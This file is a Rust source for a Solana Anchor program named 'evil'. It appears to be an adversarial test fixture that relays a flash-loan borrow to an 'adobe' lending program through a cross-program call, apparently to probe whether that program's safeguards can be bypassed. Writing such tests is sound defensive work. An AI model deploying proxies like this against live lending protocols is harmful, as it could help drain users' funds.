use anchor_lang::prelude::*;
use adobe::cpi::accounts::Borrow;

declare_id!("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS");

#[program]
#[deny(unused_must_use)]
pub mod evil {
    use super::*;

    pub fn borrow_proxy(ctx: Context<BorrowProxy>, amount: u64) -> ProgramResult {
        msg!("evil borrow");

        let adobe_context = CpiContext::new(
            ctx.accounts.adobe_program.clone(),
            Borrow {
                state: ctx.accounts.state.clone(),
                pool: ctx.accounts.pool.clone(),
                pool_token: ctx.accounts.pool_token.clone(),
                user_token: ctx.accounts.user_token.clone(),
                instructions: ctx.accounts.instructions.clone(),
                token_program: ctx.accounts.token_program.clone(),
            },
        );
        adobe::cpi::borrow(adobe_context, amount)?;

        Ok(())
    }
}

#[derive(Accounts)]
pub struct BorrowProxy<'info> {
    pub state: AccountInfo<'info>,
    pub pool: AccountInfo<'info>,
    pub pool_token: AccountInfo<'info>,
    pub user_token: AccountInfo<'info>,
    pub instructions: AccountInfo<'info>,
    pub token_program: AccountInfo<'info>,
    pub adobe_program: AccountInfo<'info>,
}
